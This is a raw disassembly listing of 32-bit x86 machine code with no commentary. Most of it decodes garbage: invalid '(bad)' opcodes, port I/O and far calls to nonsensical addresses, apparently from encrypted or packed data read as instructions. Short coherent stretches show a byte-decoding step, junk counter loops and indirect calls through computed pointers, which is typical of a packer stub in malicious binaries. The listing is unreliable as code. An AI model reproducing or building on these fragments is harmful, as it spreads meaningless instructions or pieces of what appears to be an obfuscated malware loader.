  40722c:	mov    edx,0xcbcc3640
  407231:	not    BYTE PTR [eax-0x3f629267]
  407237:	pop    esp
  407238:	popf   
  407239:	adc    DWORD PTR [ebx-0x76b9978f],edi
  40723f:	das    
  407240:	dec    ebx
  407241:	lea    esp,[edx-0x31]
  407244:	push   edx
  407245:	adc    al,BYTE PTR [esi-0x22]
  407248:	mov    dl,0x60
  40724a:	fnstenv [eax+ebp*2]
  40724d:	(bad)  
  40724e:	fistp  DWORD PTR [edi*8+0x20c112cb]
  407255:	mov    edi,0xa118e94b
  40725a:	push   ebp
  40725b:	mov    ?,esi
  40725d:	in     eax,dx
  40725e:	inc    esp
  40725f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407260:	pop    esi
  407261:	xlat   BYTE PTR ds:[ebx]
  407262:	and    al,al
  407264:	xchg   ebp,eax
  407265:	aad    0xfe
  407267:	mov    al,ds:0xe747fbd6
  40726c:	loopne 0x4072a0
  40726e:	mov    bl,0x38
  407270:	or     eax,0xdf81792d
  407275:	(bad)  
  407276:	xor    eax,0x59639b66
  40727b:	inc    edi
  40727c:	stos   DWORD PTR es:[edi],eax
  40727d:	popa   
  40727e:	nop
  40727f:	dec    ebx
  407280:	aaa    
  407281:	jne    0x4072a6
  407283:	xlat   BYTE PTR ds:[ebx]
  407284:	and    ebx,esi
  407286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407287:	loopne 0x4072fb
  407289:	pop    ds
  40728a:	xor    ebp,DWORD PTR [esi]
  40728c:	dec    ebp
  40728d:	(bad)  [edi+0x4c91db47]
  407293:	push   eax
  407294:	or     eax,0xfd8e3d
  407299:	jne    0x4072bc
  40729b:	(bad)  
  40729d:	jne    0x407314
  40729f:	mov    dh,0xa0
  4072a1:	loop   0x4072c2
  4072a3:	mov    ebx,DWORD PTR [esi-0x79e469dd]
  4072a9:	xchg   ebx,eax
  4072aa:	(bad)  
  4072ab:	pop    esp
  4072ac:	sub    BYTE PTR [ebx],0x60
  4072af:	test   DWORD PTR fs:[edx+0x14],esp
  4072b3:	sub    eax,0xe4f20eda
  4072b8:	adc    al,0x62
  4072ba:	stos   DWORD PTR es:[edi],eax
  4072bb:	mov    dl,ah
  4072bd:	push   cs
  4072be:	mov    bl,0x56
  4072c0:	fcmovnbe st,st(5)
  4072c2:	mov    bl,0xa
  4072c4:	add    cl,bl
  4072c6:	sbb    esp,DWORD PTR [edx-0x21]
  4072c9:	div    eax
  4072cb:	cmp    al,0x4c
  4072cd:	cdq    
  4072ce:	dec    esp
  4072cf:	sub    al,0x48
  4072d1:	adc    eax,0xcdc35c5a
  4072d6:	xor    eax,0xe56016f6
  4072db:	jno    0x40735a
  4072dd:	sbb    al,0x7d
  4072df:	comiss xmm1,xmm3
  4072e2:	in     al,0xfe
  4072e4:	les    ebp,FWORD PTR [edi-0x3a]
  4072e7:	xor    ah,dh
  4072e9:	inc    eax
  4072ea:	dec    esi
  4072eb:	in     eax,0x1b
  4072ed:	jge    0x4072b0
  4072ef:	shr    DWORD PTR [edi],0x21
  4072f2:	sbb    edi,0xffffffc7
  4072f5:	jle    0x40735e
  4072f7:	sbb    DWORD PTR [eax],edx
  4072f9:	jnp    0x407375
  4072fb:	inc    esp
  4072fc:	sti    
  4072fd:	sbb    ebx,DWORD PTR [esi]
  4072ff:	sar    DWORD PTR [ebx],cl
  407301:	int3   
  407302:	push   es
  407303:	pop    esp
  407304:	test   eax,esi
  407306:	aas    
  407307:	mov    ds:0x3197d633,eax
  40730c:	shr    DWORD PTR [edx+0x77],0x95
  407310:	stc    
  407311:	mov    DWORD PTR [edx+0x37],ebx
  407314:	cs xchg esp,eax
  407316:	(bad)  
  407317:	frstor [edi-0x5a914ef3]
  40731d:	mov    dl,0x52
  40731f:	push   es
  407320:	sub    eax,0x336f65dc
  407325:	loopne 0x4072a8
  407327:	enter  0xbc08,0x17
  40732b:	scas   eax,DWORD PTR es:[edi]
  40732c:	in     al,dx
  40732d:	imul   ebx,ebx,0x32
  407330:	rol    DWORD PTR [esi+0x22e6c02d],1
  407336:	in     eax,0x58
  407338:	nop
  407339:	lock add BYTE PTR [ebp-0x728212bd],ch
  407340:	pop    esi
  407341:	jno    0x407398
  407343:	mov    DWORD PTR [bx+di+0x4576],eax
  407348:	adc    BYTE PTR [ebp-0x30],cl
  40734b:	sahf   
  40734c:	nop    DWORD PTR [ebp-0x24]
  407350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407351:	cmc    
  407352:	dec    ecx
  407353:	jecxz  0x40738e
  407355:	or     dl,BYTE PTR [edx-0x61]
  407358:	sbb    bh,ch
  40735a:	iret   
  40735b:	push   esi
  40735c:	mov    esp,0x92fcb38f
  407361:	xor    al,BYTE PTR [edi]
  407363:	inc    ecx
  407364:	stos   BYTE PTR es:[edi],al
  407365:	in     al,dx
  407366:	les    eax,FWORD PTR [eax]
  407368:	fst    QWORD PTR [edx]
  40736a:	push   ebp
  40736b:	mov    ebp,ecx
  40736d:	jle    0x407388
  40736f:	test   dl,al
  407371:	or     edi,DWORD PTR [eax+0x35aee4df]
  407377:	and    al,0x85
  407379:	out    0x7c,al
  40737b:	(bad)  
  40737c:	xor    BYTE PTR [esp+esi*1-0x2cfc02c7],ch
  407383:	fcomip st,st(1)
  407385:	stos   DWORD PTR es:[edi],eax
  407386:	dec    esi
  407387:	xor    BYTE PTR [ebx-0x6b01df62],cl
  40738d:	leave  
  40738e:	js     0x40739c
  407390:	mov    eax,DWORD PTR [eax+0x198]
  407396:	push   DWORD PTR [eax]
  407398:	call   0x40d076
  40739d:	mov    ecx,DWORD PTR [ebp-0x1c]
  4073a0:	xor    ecx,esi
  4073a2:	mov    eax,0xffcd8d64
  4073a7:	sub    eax,ecx
  4073a9:	sub    eax,DWORD PTR [ebp-0x8]
  4073ac:	mov    ecx,DWORD PTR [ebp-0x30]
  4073af:	add    ecx,eax
  4073b1:	mov    eax,DWORD PTR [ebp-0x8]
  4073b4:	mov    DWORD PTR [eax+0x1],ecx
  4073b7:	mov    al,BYTE PTR [ebp-0x1]
  4073ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bd:	xor    al,0x47
  4073bf:	sub    al,0x37
  4073c1:	mov    BYTE PTR [ecx],al
  4073c3:	lea    eax,[ebp-0x8]
  4073c6:	inc    BYTE PTR [eax]
  4073c8:	inc    eax
  4073c9:	push   eax
  4073ca:	pop    ecx
  4073cb:	dec    ecx
  4073cc:	xchg   ecx,edx
  4073ce:	jmp    0x40771b
  4073d3:	sub    BYTE PTR [esi],ah
  4073d5:	cs cdq 
  4073d7:	cs mov cl,0xb3
  4073da:	mov    cl,0x3e
  4073dc:	sbb    ebp,edx
  4073de:	into   
  4073df:	fwait
  4073e0:	xchg   esi,ecx
  4073e2:	inc    edi
  4073e3:	stos   DWORD PTR es:[edi],eax
  4073e4:	shl    DWORD PTR [eax+0x70],0x20
  4073e8:	jge    0x40745a
  4073ea:	jo     0x4073b9
  4073ec:	(bad)  [edi]
  4073ee:	scas   al,BYTE PTR es:[edi]
  4073ef:	jne    0x4073ff
  4073f1:	xor    bl,BYTE PTR [ebx]
  4073f3:	cwde   
  4073f4:	jl     0x407390
  4073f6:	sub    eax,0x55b77f42
  4073fb:	hlt    
  4073fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073fd:	repnz push ecx
  4073ff:	inc    ebp
  407400:	lods   al,BYTE PTR ds:[esi]
  407401:	nop
  407402:	ret    
  407403:	xchg   edi,eax
  407404:	ins    DWORD PTR es:[edi],dx
  407405:	sbb    esi,DWORD PTR [ecx+0x483ecaec]
  40740b:	in     al,0xd
  40740d:	inc    ebp
  40740e:	loopne 0x407469
  407410:	pusha  
  407411:	fadd   DWORD PTR [eax-0x5c5bf923]
  407417:	adc    al,0x57
  407419:	repnz ins BYTE PTR es:[edi],dx
  40741b:	aad    0xbb
  40741d:	adc    al,0x94
  40741f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407420:	jl     0x4074a0
  407422:	dec    ebx
  407423:	xchg   esi,eax
  407424:	sub    BYTE PTR [ebp-0x6f],ch
  407427:	add    al,cl
  407429:	push   ebx
  40742a:	out    dx,al
  40742b:	pusha  
  40742c:	fwait
  40742d:	repnz or edi,DWORD PTR [edx-0x3a4f007a]
  407434:	clc    
  407435:	arpl   WORD PTR [ecx+ecx*4+0x285ace2d],di
  40743c:	and    eax,0x23970b48
  407441:	outs   dx,BYTE PTR ds:[esi]
  407442:	jae    0x4073cb
  407444:	xlat   BYTE PTR ds:[ebx]
  407445:	shl    DWORD PTR [edi+0x1e],1
  407448:	dec    esi
  407449:	cmp    ebx,DWORD PTR [eax+0x42]
  40744c:	test   DWORD PTR [ebx-0x8e4cbfc],eax
  407452:	dec    eax
  407453:	neg    dl
  407455:	pop    es
  407456:	js     0x4074bb
  407458:	sahf   
  407459:	jle    0x407449
  40745b:	jmp    0x253c6153
  407460:	imul   eax,DWORD PTR [ebx],0x47
  407463:	mov    al,ds:0x889b0f14
  407468:	jbe    0x407444
  40746a:	in     eax,0x9c
  40746c:	jb     0x40749b
  40746e:	scas   al,BYTE PTR es:[edi]
  40746f:	and    BYTE PTR [esi+0x7f],0xa4
  407473:	pop    ebp
  407474:	sahf   
  407475:	popf   
  407476:	fs int 0x6
  407479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40747a:	xchg   ebx,eax
  40747b:	scas   al,BYTE PTR es:[edi]
  40747c:	dec    edx
  40747d:	sbb    eax,0xd7f7134f
  407482:	rcr    DWORD PTR [ebp+0x6],cl
  407485:	shr    DWORD PTR [esi-0x19aec5fc],cl
  40748b:	push   ebx
  40748c:	ss ja  0x407422
  40748f:	mov    ebx,0x6e90a969
  407494:	jnp    0x40748a
  407496:	xor    edi,DWORD PTR [esi-0x24]
  407499:	mov    dh,0xda
  40749b:	and    ebp,ebp
  40749d:	pop    ss
  40749e:	in     al,dx
  40749f:	jns    0x407503
  4074a1:	xchg   ebp,eax
  4074a2:	hlt    
  4074a3:	(bad)  
  4074a4:	lock hlt 
  4074a6:	call   0x3ffaab82
  4074ab:	dec    edx
  4074ac:	pop    ebx
  4074ad:	xchg   ebx,eax
  4074ae:	xlat   BYTE PTR ds:[ebx]
  4074af:	jnp    0x40748f
  4074b1:	or     esp,DWORD PTR [ebx-0x53057293]
  4074b7:	mov    ds:0x700b73cf,al
  4074bc:	adc    ecx,DWORD PTR [ecx]
  4074be:	xchg   ecx,eax
  4074bf:	mov    ebp,0x2a345609
  4074c4:	cmc    
  4074c5:	loopne 0x4074a1
  4074c7:	mov    al,ds:0x881e5b89
  4074cc:	mov    al,ds:0xd618d43
  4074d1:	dec    esp
  4074d2:	push   esi
  4074d3:	pop    ebp
  4074d4:	into   
  4074d5:	adc    al,0x92
  4074d7:	in     eax,0x1a
  4074d9:	mov    al,ds:0xed7632ad
  4074de:	push   ds
  4074df:	cmp    al,0x40
  4074e1:	mov    edx,0x8c3357db
  4074e6:	(bad)  
  4074e7:	mov    ch,0x2
  4074e9:	inc    eax
  4074ea:	inc    edx
  4074eb:	test   DWORD PTR [edi+esi*1-0x655877c8],0xd9b4cb5f
  4074f6:	shr    DWORD PTR [eax],1
  4074f8:	out    dx,al
  4074f9:	es jg  0x40748e
  4074fc:	xlat   BYTE PTR ds:[ebx]
  4074fd:	mov    es,WORD PTR [edi]
  4074ff:	jb     0x40750a
  407501:	pop    es
  407502:	fist   DWORD PTR [esi-0x5b]
  407505:	clc    
  407506:	cmp    eax,0x2608e191
  40750b:	imul   ebx,DWORD PTR [ebx+0x55],0xf5dfff0e
  407512:	mov    al,0x8e
  407514:	xchg   ecx,eax
  407515:	imul   ebx,DWORD PTR [edx-0x34756315],0x28205e00
  40751f:	gs shl cl,0x19
  407523:	and    DWORD PTR gs:[esi-0x2d593855],ebx
  40752a:	mov    WORD PTR [ebp-0x3d],ss
  40752d:	fmul   st(6),st
  40752f:	retf   
  407530:	fisubr WORD PTR [edx+0x42e0aa12]
  407536:	into   
  407537:	dec    esp
  407538:	test   eax,0xfb15b91f
  40753d:	inc    ecx
  40753e:	test   al,0x14
  407540:	jns    0x4075be
  407542:	retf   0xd880
  407545:	ret    
  407546:	xor    DWORD PTR ds:0xbbc62c47,esp
  40754c:	mov    DWORD PTR [ecx+0x55],ecx
  40754f:	sti    
  407550:	loopne 0x40750d
  407552:	xor    al,BYTE PTR [ecx+eiz*4]
  407555:	gs (bad) 
  407557:	stc    
  407558:	or     BYTE PTR [ebx-0x7e],cl
  40755b:	xor    eax,0x628248e5
  407560:	jle    0x4075ac
  407562:	push   0xc6bcb6e6
  407567:	adc    edi,DWORD PTR [edi]
  407569:	inc    ebx
  40756a:	(bad)  
  40756b:	retf   0x6881
  40756e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40756f:	sbb    BYTE PTR [eax-0x5e2fc7a4],0x67
  407576:	or     BYTE PTR [edi+edx*4-0x66ffe7f0],al
  40757d:	cmc    
  40757e:	push   ss
  40757f:	fild   DWORD PTR [esi-0x45]
  407582:	xor    DWORD PTR ds:[ebp+eax*1+0x72a2e18],edx
  40758a:	iret   
  40758b:	jmp    FWORD PTR [esi]
  40758d:	mov    ss,ebx
  40758f:	icebp  
  407590:	ds aas 
  407592:	cli    
  407593:	addr16 mov eax,0x5a3f94bc
  407599:	jno    0x4075c9
  40759b:	shl    BYTE PTR [ecx],1
  40759d:	pop    edi
  40759e:	mov    esp,0xd9fac50e
  4075a3:	cmp    esi,edx
  4075a5:	xor    al,0x7a
  4075a7:	jnp    0x4075eb
  4075a9:	sbb    dl,BYTE PTR [ecx-0xf]
  4075ac:	iret   
  4075ad:	not    DWORD PTR [eax-0x53]
  4075b0:	pushf  
  4075b1:	mov    ecx,0x883697a9
  4075b6:	imul   edx,DWORD PTR [esi-0xe84f0c8],0xde33a6e8
  4075c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075c1:	retf   
  4075c2:	mov    ds:0xe6e5af3a,al
  4075c7:	cmc    
  4075c8:	pop    ecx
  4075c9:	inc    edx
  4075ca:	push   es
  4075cb:	ss or  eax,0x7b292a45
  4075d1:	aam    0x2e
  4075d3:	push   ecx
  4075d4:	jmp    0x40761f
  4075d6:	add    eax,0xc71cbb73
  4075db:	ss loopne 0x40763d
  4075de:	test   DWORD PTR [edi+0x56d407ad],esp
  4075e4:	dec    ebp
  4075e5:	pop    esp
  4075e6:	fsubr  DWORD PTR [ebp+0x4d7d1161]
  4075ec:	cmp    BYTE PTR ds:[edx],0x77
  4075f0:	idiv   ah
  4075f2:	jne    0x407598
  4075f4:	xchg   esi,eax
  4075f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075f6:	add    DWORD PTR [edx],0x976b8eb
  4075fc:	out    0x8,al
  4075fe:	add    al,0x58
  407600:	xor    al,0x52
  407602:	shl    esp,1
  407604:	mov    ds,WORD PTR [edx-0x4d44b47]
  40760a:	jo     0x4075cb
  40760c:	xor    bh,bh
  40760e:	mov    eax,ds:0xb6b3effa
  407613:	push   0x875b75d
  407618:	and    al,0x2e
  40761a:	xor    BYTE PTR es:[esi],al
  40761d:	adc    DWORD PTR [ebx+0x15],0xffffffcc
  407621:	mov    BYTE PTR [ebx],bh
  407623:	jbe    0x4075a6
  407625:	push   ebx
  407626:	aaa    
  407627:	test   al,0xf4
  407629:	stc    
  40762a:	jge    0x4075d5
  40762c:	jge    0x407671
  40762e:	arpl   WORD PTR [esi],cx
  407630:	stc    
  407631:	sti    
  407632:	test   al,0x86
  407634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407635:	int    0xb7
  407637:	loop   0x407691
  407639:	jp     0x407628
  40763b:	xchg   esp,eax
  40763c:	jge    0x407680
  40763e:	push   ss
  40763f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407640:	mov    bl,0xfe
  407642:	xchg   esi,eax
  407643:	sub    eax,0x80700393
  407648:	jbe    0x407630
  40764a:	mov    bl,BYTE PTR [eax+0x5a]
  40764d:	sub    bl,BYTE PTR [esi+0x237f055d]
  407653:	sar    DWORD PTR [edx],cl
  407655:	add    DWORD PTR [ebx+0xe314b93],eax
  40765b:	sbb    BYTE PTR [ecx],dl
  40765d:	sbb    eax,0xcf8a9d13
  407663:	loopne 0x407629
  407665:	xor    eax,0x7eca6b85
  40766a:	out    dx,eax
  40766b:	and    edx,edx
  40766d:	ret    0xe67a
  407670:	jl     0x407612
  407672:	mov    al,0xc4
  407674:	daa    
  407675:	fidiv  WORD PTR [ecx+0x2a254b45]
  40767b:	inc    eax
  40767c:	xchg   ebp,eax
  40767d:	cmp    DWORD PTR [edx],ecx
  40767f:	cmp    DWORD PTR [ebp-0x1ef8daec],edx
  407685:	pushf  
  407686:	sahf   
  407687:	sub    esi,eax
  407689:	jns    0x40761b
  40768b:	call   0x11a9a898
  407690:	pusha  
  407691:	push   edx
  407692:	and    eax,0x10cfb51b
  407697:	int3   
  407698:	mov    al,0xa0
  40769a:	js     0x4076d5
  40769c:	mov    WORD PTR [edx],fs
  40769e:	mov    ecx,0x883b2121
  4076a3:	nop
  4076a4:	cmp    DWORD PTR [eax-0x1e6d2d10],ecx
  4076aa:	stos   BYTE PTR es:[edi],al
  4076ab:	cmp    esp,ebp
  4076ad:	inc    eax
  4076ae:	es push esp
  4076b0:	push   esp
  4076b1:	lds    edx,FWORD PTR [ebx]
  4076b3:	retf   0x153c
  4076b6:	adc    DWORD PTR [edi+0x14eefe29],0x5860b453
  4076c0:	push   0x8fd3293
  4076c5:	push   edi
  4076c6:	enter  0x1b53,0xda
  4076ca:	sub    BYTE PTR [ebx+0x5608ec7e],ah
  4076d0:	imul   ecx,ebp,0x2c0bbb82
  4076d6:	mov    edi,DWORD PTR [esi+esi*8-0x23]
  4076da:	lods   al,BYTE PTR ds:[esi]
  4076db:	xchg   esp,eax
  4076dc:	out    0x5e,eax
  4076de:	cld    
  4076df:	mov    edi,0xeaba78c5
  4076e4:	ss mov ebx,0x9aaf17da
  4076ea:	cmp    BYTE PTR [edx],0x1c
  4076ed:	xchg   BYTE PTR [edx-0x6a],bl
  4076f0:	cwde   
  4076f1:	out    dx,al
  4076f2:	repz addr16 mov bh,0xf5
  4076f6:	imul   esi,DWORD PTR [esi+0x568ad1f2],0x16
  4076fd:	add    al,BYTE PTR [edx]
  4076ff:	inc    ecx
  407700:	lods   al,BYTE PTR ds:[esi]
  407701:	sbb    BYTE PTR [edi-0xc],dl
  407704:	es jmp 0x4076f0
  407707:	data16 sub BYTE PTR [esi],bl
  40770a:	push   esp
  40770b:	xchg   edi,eax
  40770c:	call   0x1d33:0x9ce7b27c
  407713:	mov    edx,0xff5cfdf1
  407718:	cli    
  407719:	jnp    0x4076ba
  40771b:	dec    BYTE PTR [edx]
  40771d:	push   DWORD PTR [ebp-0x10]
  407720:	mov    eax,ds:0x41625c
  407725:	mov    eax,DWORD PTR [eax]
  407727:	push   DWORD PTR [eax]
  407729:	lea    eax,ds:0x416278
  40772f:	push   DWORD PTR [eax]
  407731:	lea    eax,ds:0x416024
  407737:	push   DWORD PTR [eax]
  407739:	lea    eax,ds:0x416258
  40773f:	push   DWORD PTR [eax]
  407741:	lea    eax,ds:0x4162e0
  407747:	push   DWORD PTR [eax]
  407749:	xchg   ebx,edx
  40774b:	inc    ebx
  40774c:	inc    ebx
  40774d:	sub    ebx,0x3
  407750:	push   ebx
  407751:	pop    eax
  407752:	call   DWORD PTR [eax+0x1]
  407755:	mov    eax,DWORD PTR [ebp-0x20]
  407758:	mov    ecx,DWORD PTR ds:0x41621c
  40775e:	add    DWORD PTR [eax],ecx
  407760:	pop    edi
  407761:	pop    esi
  407762:	pop    ebx
  407763:	leave  
  407764:	ret    
  407765:	push   ebp
  407766:	mov    ebp,esp
  407768:	sub    esp,0x44
  40776b:	push   edi
  40776c:	sbb    DWORD PTR ds:0x434419,edx
  407772:	mov    eax,DWORD PTR [ebp+0xc]
  407775:	mov    edx,DWORD PTR ds:0x432e64
  40777b:	mov    edi,DWORD PTR ds:0x434449
  407781:	sub    edx,edi
  407783:	xor    edx,DWORD PTR [edx+edi*1]
  407786:	mov    DWORD PTR [ebp-0x10],eax
  407789:	adc    DWORD PTR ds:0x432de6,edx
  40778f:	mov    eax,DWORD PTR [ebp+0x8]
  407792:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  407799:	sub    ecx,DWORD PTR ds:0x434366
  40779f:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	and    DWORD PTR ds:0x4326ec,0x0
  4077b3:	xor    edi,edi
  4077b5:	add    edi,DWORD PTR ds:0x4326ec
  4077bb:	inc    edi
  4077bc:	mov    DWORD PTR ds:0x4326ec,edi
  4077c2:	cmp    DWORD PTR ds:0x4326ec,0xb
  4077c9:	jne    0x4077e2
  4077cf:	push   DWORD PTR [ebp-0x14]
  4077d2:	push   0x178d
  4077d7:	push   0x434421
  4077dc:	call   DWORD PTR ds:0x4329ca
  4077e2:	cmp    DWORD PTR ds:0x4326ec,0xa
  4077e9:	jne    0x4077fe
  4077ef:	xor    edi,edi
  4077f1:	add    edi,DWORD PTR ds:0x4326ec
  4077f7:	inc    edi
  4077f8:	mov    DWORD PTR ds:0x4326ec,edi
  4077fe:	cmp    DWORD PTR ds:0x4326ec,0x1b
  407805:	jb     0x4077b3
  40780b:	mov    DWORD PTR [ebp-0x40],eax
  40780e:	mov    eax,0x7510855
  407813:	or     edi,edi
  407815:	xor    edx,eax
  407817:	mov    ecx,0x32729c
  40781c:	adc    DWORD PTR ds:0x432dde,edi
  407822:	add    edx,ecx
  407824:	mov    edi,DWORD PTR ds:0x43436e
  40782a:	or     DWORD PTR ds:0x4326fc,edi
  407830:	mov    DWORD PTR [ebp-0x8],edx
  407833:	adc    DWORD PTR ds:0x434415,ecx
  407839:	mov    edx,DWORD PTR [ebp+0x8]
  40783c:	sbb    DWORD PTR ds:0x432700,0x434392
  407846:	xor    edx,eax
  407848:	add    edx,ecx
  40784a:	mov    edi,DWORD PTR ds:0x4326ec
  407850:	or     edi,DWORD PTR ds:0x4326f0
  407856:	mov    DWORD PTR ds:0x4326ec,edi
  40785c:	mov    DWORD PTR [ebp+0xc],edx
  40785f:	inc    edi
  407860:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  407867:	mov    DWORD PTR ds:0x434425,0x1e
  407871:	cmp    DWORD PTR ds:0x434425,0x0
  407878:	je     0x407aca
  40787e:	cmp    DWORD PTR ds:0x434425,0x22
  407885:	jne    0x407891
  40788b:	call   DWORD PTR ds:0x432cf6
  407891:	xor    edi,edi
  407893:	add    edi,DWORD PTR ds:0x434425
  407899:	dec    edi
  40789a:	mov    DWORD PTR ds:0x434425,edi
  4078a0:	jmp    0x407871
  4078a5:	mov    edx,DWORD PTR ds:0x4343a6
  4078ab:	mov    edi,DWORD PTR ds:0x434469
  4078b1:	sub    edx,edi
  4078b3:	add    edx,DWORD PTR [edx+edi*1]
  4078b6:	jmp    0x407aca
  4078bb:	fldcw  WORD PTR [eax+0x3e]
  4078be:	cs push ecx
  4078c0:	mov    dh,0xe9
  4078c2:	jae    0x407865
  4078c4:	shl    DWORD PTR [edi+0x64],cl
  4078c7:	lods   eax,DWORD PTR ds:[esi]
  4078c8:	mov    esp,0xce5bc734
  4078cd:	jo     0x40793f
  4078cf:	imul   edi,DWORD PTR [edi+0x70],0x3b154f70
  4078d6:	sbb    ebx,0xeb8b50bd
  4078dc:	ret    0x31fd
  4078df:	mov    ah,0x84
  4078e1:	leave  
  4078e2:	and    eax,DWORD PTR [edi]
  4078e4:	xor    DWORD PTR [ebp-0x60],ebp
  4078e7:	pop    esp
  4078e8:	mov    edx,esp
  4078ea:	fwait
  4078eb:	mov    ecx,DWORD PTR [esp+edx*8-0x5c]
  4078ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078f0:	ins    DWORD PTR es:[edi],dx
  4078f1:	pop    edx
  4078f2:	or     dl,BYTE PTR [esi]
  4078f4:	jbe    0x4078fa
  4078f6:	add    BYTE PTR [ebx],dh
  4078f8:	add    bl,BYTE PTR [ebx+0xe1edde3]
  4078fe:	or     BYTE PTR [ecx-0x6085c0e1],cl
  407904:	or     al,0x4f
  407906:	pop    ebp
  407907:	ret    0xba34
  40790a:	mov    edi,DWORD PTR [ebp-0x66]
  40790d:	enter  0xeb57,0x2a
  407911:	cmp    al,0x5e
  407913:	dec    edx
  407914:	pop    ss
  407915:	mov    ds:0xfc649e7d,eax
  40791a:	test   BYTE PTR [esi-0x9e59146],al
  407920:	mov    DWORD PTR ds:0x94b031f5,edi
  407926:	pushf  
  407927:	xor    DWORD PTR [esi+ecx*2],ebx
  40792a:	gs out 0x47,al
  40792d:	shl    DWORD PTR [esi+0x4ae634ce],0xb6
  407934:	and    edx,esp
  407936:	es jns 0x4079b7
  407939:	in     al,0x29
  40793b:	or     DWORD PTR [ebp+0x1e],esi
  40793e:	jmp    0x1808d0bc
  407943:	or     DWORD PTR [esi],edx
  407945:	inc    ecx
  407946:	inc    edi
  407947:	clc    
  407948:	and    al,0x49
  40794a:	dec    eax
  40794b:	add    dl,BYTE PTR [ebx]
  40794d:	std    
  40794e:	inc    esp
  40794f:	jo     0x40792b
  407951:	mov    BYTE PTR [edx+eiz*2],ch
  407954:	dec    edi
  407955:	in     al,0x39
  407957:	adc    bh,dl
  407959:	jecxz  0x4079a1
  40795b:	jecxz  0x40796e
  40795d:	jle    0x40794c
  40795f:	add    BYTE PTR [ebx+0x65],bh
  407962:	push   cs
  407963:	repnz sahf 
  407965:	mov    bl,cl
  407967:	fdivr  st(2),st
  407969:	mov    cl,BYTE PTR [edx+0x294fc9ff]
  40796f:	inc    esp
  407970:	push   ss
  407971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407972:	stos   DWORD PTR es:[edi],eax
  407973:	pusha  
  407974:	retf   
  407975:	sub    bl,BYTE PTR [ebp-0x70]
  407978:	or     DWORD PTR [esi-0x61c103cc],eax
  40797e:	outs   dx,BYTE PTR ds:[esi]
  40797f:	daa    
  407980:	mov    cl,0xf1
  407982:	mov    ebp,0x92978abb
  407987:	jbe    0x40791c
  407989:	jmp    FWORD PTR [eax-0x3229f610]
  40798f:	bnd ret 0xf50c
  407993:	inc    esp
  407994:	mov    al,ds:0xbe8361ac
  407999:	jl     0x4079a4
  40799b:	xchg   esi,eax
  40799c:	adc    eax,0x48234d3c
  4079a1:	adc    ebp,DWORD PTR [esi]
  4079a3:	mov    ecx,0xa30bcecf
  4079a8:	out    0xac,al
  4079aa:	mov    edi,0x757be4b4
  4079af:	popa   
  4079b0:	cli    
  4079b1:	call   0x48b07b
  4079b6:	jl     0x4079c6
  4079b8:	adc    dh,ah
  4079ba:	in     eax,0x9a
  4079bc:	lock add eax,0x7f718fc7
  4079c2:	sbb    esp,eax
  4079c4:	xchg   esp,eax
  4079c5:	shl    DWORD PTR [ebp+0x34ea1937],1
  4079cb:	sub    bl,BYTE PTR [edx-0x682cd898]
  4079d1:	fiadd  DWORD PTR [edx]
  4079d3:	mov    al,ds:0x84186f9
  4079d8:	jno    0x407a17
  4079da:	stos   BYTE PTR es:[edi],al
  4079db:	ffreep st(7)
  4079dd:	mov    eax,0x7758e9c4
  4079e2:	inc    esi
  4079e3:	and    DWORD PTR [edi],esi
  4079e5:	mov    ds:0x377e4a69,eax
  4079ea:	adc    BYTE PTR [ecx],cl
  4079ec:	inc    edi
  4079ed:	pusha  
  4079ee:	outs   dx,BYTE PTR ds:[esi]
  4079ef:	or     al,0xdd
  4079f1:	cmp    bh,bh
  4079f3:	jb     0x407981
  4079f5:	cmp    DWORD PTR [ecx*4+0x25e55df6],eax
  4079fc:	test   DWORD PTR [eax],ecx
  4079fe:	cmp    al,0x75
  407a00:	fisubr WORD PTR [eax-0x76]
  407a03:	test   BYTE PTR [ebx],dh
  407a05:	test   BYTE PTR [esi],bl
  407a07:	into   
  407a08:	pop    edx
  407a09:	xchg   ebx,eax
  407a0a:	call   0x72b9:0xde90ba73
  407a11:	ret    0x16ab
  407a14:	je     0x407a79
  407a16:	push   ebx
  407a17:	ja     0x407a44
  407a19:	mov    edx,0x28a253e1
  407a1e:	jge    0x4079ef
  407a20:	dec    ebx
  407a21:	nop
  407a22:	and    edx,DWORD PTR ds:0x8ed34eb
  407a28:	stos   DWORD PTR es:[edi],eax
  407a29:	xlat   BYTE PTR ds:[ebx]
  407a2a:	sub    DWORD PTR [ecx-0x3730b9f4],0xce6533f7
  407a34:	push   eax
  407a35:	cwde   
  407a36:	cmp    al,BYTE PTR [ebp-0x6d]
  407a39:	sub    BYTE PTR [ebx],0xc6
  407a3c:	pop    gs
  407a3e:	jne    0x4079d8
  407a40:	int    0x1c
  407a42:	mov    esi,0xc89d7058
  407a47:	dec    edi
  407a48:	or     eax,0x4aa4277d
  407a4d:	push   ebp
  407a4e:	sub    eax,0xeb3b9a2e
  407a53:	xchg   edx,eax
  407a54:	push   es
  407a55:	hlt    
  407a56:	xor    cl,al
  407a58:	inc    esp
  407a59:	std    
  407a5a:	daa    
  407a5b:	push   esi
  407a5c:	fst    QWORD PTR cs:[edx-0x497fbd9e]
  407a63:	fidiv  WORD PTR [ebp-0x53]
  407a66:	push   cs
  407a67:	pushf  
  407a68:	mov    ebp,DWORD PTR [ebp-0x1f]
  407a6b:	das    
  407a6c:	push   ebx
  407a6d:	inc    ebp
  407a6e:	cdq    
  407a6f:	jle    0x407aaa
  407a71:	mov    bl,0x68
  407a73:	mov    ds:0x9ebd43e3,eax
  407a78:	or     eax,0x87a131c9
  407a7d:	shl    ebp,0x98
